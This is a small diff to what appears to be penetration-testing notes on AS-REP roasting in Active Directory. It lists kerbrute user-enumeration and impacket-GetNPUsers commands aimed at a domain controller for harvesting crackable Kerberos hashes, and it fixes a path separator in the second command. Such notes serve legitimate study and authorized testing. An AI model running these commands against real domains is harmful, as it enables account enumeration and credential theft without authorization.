@@ -31,5 +31,5 @@
 ## AS-REP Roasting (Authentication Reply Roasting)
 1. If pre-authentication is disabled, and we provide a list of userlists to the domain controller (AS-REQ), the DC will grant us TGT. If the passwords are weak, we can crack the TGT and gain access. We can use krebrute, impacket, or crackmap
 2. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
-3. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME\`
+3. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
 4. Crack the hash
